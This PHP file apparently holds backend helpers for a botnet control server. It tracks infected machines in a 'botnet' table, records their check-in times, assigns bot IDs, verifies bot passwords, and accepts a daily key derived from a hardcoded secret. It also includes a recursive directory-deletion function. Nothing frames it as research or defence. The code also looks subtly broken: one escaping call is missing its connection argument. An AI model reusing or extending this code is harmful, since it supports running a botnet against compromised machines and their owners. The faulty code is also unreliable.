<?php
function updateTimestamp($machineID){
	require('connect.php');
	$stmt = $conn->prepare("UPDATE botnet SET last_signal=CURRENT_TIMESTAMP WHERE machineID=?");
	$stmt->bind_param("s", $machineID);
	$stmt->execute();
	require('disconnect.php');
}

function deleteDir($src) {
    $dir = opendir($src);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            $full = $src . '/' . $file;
            if ( is_dir($full) ) {
                deleteDir($full);
            }
            else {
                unlink($full);
            }
        }
    }
    closedir($dir);
    rmdir($src);
}

function recursiveMakeDir($currentDir,$path){
	foreach(explode("/",$path) as $folder){
		$currentDir=$currentDir.$folder."/";
		if(!is_dir($currentDir))
			mkdir($currentDir);
	}
}

function checkPassword($machineID, $password){
	require('connect.php');
	$stmt = $conn->prepare("SELECT * FROM botnet WHERE machineID=? AND password=?");
	$stmt->bind_param("ss", $machineID, hash("sha256", mysqli_real_escape_string($password)));
	$stmt->execute();
	$stmt->store_result();
    $num_row = $stmt->num_rows;
	require('disconnect.php');
	if ($num_row === 1) {
        return true;
    }
    else
    {   
       return false;  
    }
}

function getValidMachineID(){
	require('connect.php');
	$found=false;
	while(!$found){
		$machineID=randomAlphaNumericString(64);
		$stmt = $conn->prepare("SELECT * FROM botnet WHERE machineID=?");
		$stmt->bind_param("s", $machineID);
		$stmt->execute();
		$stmt->store_result();
		$num_row = $stmt->num_rows;
		if ($num_row === 0) {
			$found=true;
		}
	}
	require('disconnect.php');
	return $machineID;
}

function checkKey($key){
	if ($key==hash("sha256",gmdate("Y-m-d")."_d4mny0uf0undm3!!!") || $key==hash("sha256",gmdate("Y-m-d",strtotime("-1 days"))."_d4mny0uf0undm3!!!"))
		return true;
}

function randomAlphaNumericString($length)
{
	$keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $pieces = [];
    $max = mb_strlen($keyspace, '8bit') - 1;
    for ($i = 0; $i < $length; ++$i) {
        $pieces []= $keyspace[random_int(0, $max)];
    }
    return implode('', $pieces);
}
?>